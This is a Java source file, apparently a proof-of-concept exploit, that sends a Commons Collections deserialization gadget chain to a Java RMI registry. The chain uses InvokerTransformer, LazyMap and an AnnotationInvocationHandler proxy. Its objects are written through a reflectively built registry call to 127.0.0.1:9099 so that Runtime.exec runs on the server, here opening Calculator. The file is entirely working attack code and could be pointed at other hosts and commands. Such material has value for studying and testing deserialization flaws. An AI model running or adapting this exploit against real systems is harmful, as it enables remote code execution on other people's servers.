package org.trganda.client;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.trganda.remote.RemoteService;
import sun.rmi.transport.StreamRemoteCall;

import java.io.ObjectOutput;
import java.lang.reflect.*;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.util.HashMap;
import java.util.Map;

public class EvilRMIClient2Registry {

    public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"})
        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                        getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, lazyMap);

        Map map = (Map) Proxy.
                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, map);

        return anotherHandler;
    }

    public void callRemote(String name) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        try {
            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
            Field operations = registry.getClass().getDeclaredField("operations");
            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");

            ref.setAccessible(true);
            operations.setAccessible(true);
            interfaceHash.setAccessible(true);
            RemoteRef refs = (RemoteRef) ref.get(registry);

            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);

            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
            ObjectOutput out = call.getOutputStream();
            out.writeObject(create());

            invoke.invoke(refs, call);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient2Registry rc = new EvilRMIClient2Registry();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
